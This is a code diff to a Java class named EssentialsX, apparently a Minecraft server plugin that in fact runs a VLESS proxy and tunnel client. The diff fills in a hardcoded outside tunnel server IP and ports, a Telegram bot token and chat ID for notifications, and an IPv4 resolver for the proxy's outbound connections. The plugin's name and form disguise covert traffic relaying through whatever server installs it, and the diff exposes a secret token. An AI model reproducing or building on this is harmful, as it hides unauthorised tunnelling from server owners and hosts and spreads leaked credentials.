@@ -31,14 +31,14 @@ public class EssentialsX extends JavaPlugin {
 
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
-    static final String TUNNEL_HOST = "";
-    static final int TUNNEL_PORT = 0;
-    static final int TUNNEL_PORT_INGRESS = ; //填写公网入站端口只用于TG通知
+    static final String TUNNEL_HOST = "92.5.191.20";
+    static final int TUNNEL_PORT = 6005;
+    static final int TUNNEL_PORT_INGRESS = 5005; //填写公网入站端口只用于TG通知
     static final int TUNNEL_LOCAL_PORT = 65534;
 
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "";
-    static final String TG_CHAT_ID = "";
+    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    static final String TG_CHAT_ID = "5800052646";
 
     // 服务器名称
     static final String SERVER_NAME = "Hoster24德国家宽";
@@ -212,6 +212,25 @@ public class EssentialsX extends JavaPlugin {
     /** 当前存活的隧道数据会话数（open 成功 +1, 关闭 -1） */
     private final java.util.concurrent.atomic.AtomicInteger sessionsOpen = new java.util.concurrent.atomic.AtomicInteger(0);
 
+    /**
+     * 解析目标地址, 强制优先 IPv4 (A 记录)。
+     * 面板/容器环境通常没有 IPv6 路由, 双栈域名解析出 AAAA 后 connect()
+     * 会去连 v6 地址, 内核查不到路由瞬间抛 ENETUNREACH
+     * (SocketException: Network is unreachable) — 与网络抖动无关。
+     * host 为 IPv4 字面量时 getAllByName 不产生任何 DNS 查询。
+     * 确实只有 IPv6 记录时回退原地址, 不误伤 v6-only 目标。
+     */
+    private static java.net.InetAddress resolveIPv4(String host) throws java.net.UnknownHostException {
+        java.net.InetAddress[] all = java.net.InetAddress.getAllByName(host);
+        java.net.InetAddress fallback = null;
+        for (java.net.InetAddress a : all) {
+            if (a instanceof java.net.Inet4Address) return a;   // 有 A 记录就走 v4
+            if (fallback == null) fallback = a;
+        }
+        if (fallback == null) throw new java.net.UnknownHostException(host);
+        return fallback;
+    }
+
     /** 返回 true 表示握手成功 */
     private boolean tryHandshake(WebSocket conn, ByteBuffer first) {
         byte[] buf = new byte[first.remaining()];
@@ -264,7 +283,7 @@ public class EssentialsX extends JavaPlugin {
             conn.send(new byte[]{(byte) ver, 0});
 
             Socket remote = new Socket();
-            remote.connect(new InetSocketAddress(host, port), 8000);
+            remote.connect(new InetSocketAddress(resolveIPv4(host), port), 8000);
             remote.setTcpNoDelay(true);
 
             if (init.length > 0) {
